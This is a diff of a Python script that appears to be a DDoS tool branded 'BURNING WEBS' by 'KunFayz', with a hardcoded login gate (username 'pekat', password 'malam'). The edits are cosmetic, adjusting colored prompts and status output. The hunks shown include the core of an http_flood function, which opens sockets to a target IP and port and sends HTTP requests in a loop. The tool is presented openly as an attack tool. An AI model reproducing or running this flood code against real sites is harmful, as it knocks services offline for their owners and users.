@@ -34,8 +34,8 @@ print(f"\033[97m ║ \033[100m{' ' * 4}https://www.https//kunkaffa@gmail.com{' '
 print(f"\033[97m ╚{'═' * 80}╝")
 while attemps < 100:
     print("\033[38;5;6m┏━━KunFayz━━⬣")
-    username = input("\033[38;5;6mm┗> Enter Username: \033[30m")
-    password = input("\033[38;5;6mm┗> Enter password: \033[30m")
+    username = input("\033[38;5;6m┗> Enter Username: \033[30m")
+    password = input("\033[38;5;6m┗> Enter password: \033[30m")
 
     if username == 'pekat' and password == 'malam':
         print("\033[100m \033[31m••> BURNING WEBS 210πiS \033[0m")
@@ -141,8 +141,8 @@ def http_flood(ip, port, duration):
             sock.connect((ip, port))
             sock.sendall(http_request)
             sent += 1
-            print(f"\033[103m\033[30mHttp-flood\033[0m \033[32m{sent} \033[37m{ip} \033[37mworking")
-            print(f" \033[33mHttp-flood \033[33m{sent} \033[46m{ip} \033[33mworking")
+            print(f"\033[103m\033[30mHttp-flood\033[0m \033[32m{sent} \033[37m| {ip} | \033[37mworking")
+            print(f" \033[33mHttp-flood \033[1m{sent}\033[0m \033[46m| {ip} | \033[33mworking")
         except KeyboardInterrupt:
             print("\n[-] Attack stopped by user")
             break
